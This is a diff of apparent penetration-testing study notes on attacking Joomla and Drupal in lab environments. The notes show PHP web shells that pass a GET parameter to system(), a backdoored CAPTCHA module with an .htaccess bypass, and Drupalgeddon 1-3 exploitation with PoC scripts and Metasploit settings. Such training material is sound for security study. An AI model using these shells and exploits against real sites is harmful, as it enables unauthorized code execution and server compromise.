@@ -263,7 +263,10 @@ then we can execute code with a `curl` command:
 curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
 Here we edited the `error.php` page.
+
 *Note: It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.*
+
+*Note: If we receive an error stating "An error has occurred. Call to a member function format() on null" after logging in to the admin page, navigate to "http://dev.company.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.*
 
 ### Leveraging Known Vulnerabilities
 Once we find the version, we can look for exploits in `exploit-db`.
@@ -298,5 +301,107 @@ If we get 404 response, there might be a newer version of Drupal in use which bl
 ```
 droopescan scan drupal -u http://drupal.company.local
 ```
+## Attacks
 
+### Leveraging the PHP Filter Module
+In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated." We could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page. After that we can create a page with a malicious PHP snippet.
+```
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+```
+We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, e.g `http://drupal-qa.company.local/node/3`.
+
+```
+curl -s http://drupal-qa.company.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+```
+From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
+```
+wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+```
+Once downloaded go to `Administration` > `Reports` > `Available updates`.
+
+*Note: Location may differ based on the Drupal version and may be under the Extend menu.*
+
+From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.
+
+Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.
+
+### Uploading a Backdoored Module
+Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module.
+Example:
+Let's pick the CAPTCHA module.
+```
+wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz
+```
+Create PHP web shell:
+```
+<?php
+system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+?>
+```
+Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
+```
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+```
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+```
+Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
+
+Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.
+```
+curl -s drupal.company.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+```
+
+### Drupalgeddon
+This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user.
+We can add a new admin user with [this PoC script](https://www.exploit-db.com/exploits/34992). Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
+```
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+```
+We could also use the `exploit/multi/http/drupal_drupageddon` Metasploit module to exploit this.
+
+### Drupalgeddon2
+We can use [this PoC](https://www.exploit-db.com/exploits/44448) to confirm this vulnerability.
+```
+python3 drupalgeddon2.py 
+```
+Then:
+```
+curl -s http://drupal-dev.company.local/hello.txt
+```
+Then we can replace the `echo` command in the exploit script with a command to write out our malicious PHP script:
+```
+echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+```
+```
+echo "<base64 encoded string>" | base64 -d | tee mrb3n.php
+```
+Then run the modifed exploit script to upload our malicious PHP file:
+```
+python3 drupalgeddon2.py
+```
+Finally RCE:
+```
+curl http://drupal-dev.compnay.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+```
+### Drupalgeddon3
+Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie. Once we have the session cookie, we can set up the exploit module as follows:
+```
+use exploit multi/http/drupal_drupageddon3
+set rhost <IP address>
+set VHOST <URI>
+set drupal_session <session cookie>
+set DRUPAL_NODE <number>
+set LHOST <local IP address>
+show options
+exploit
+```
 
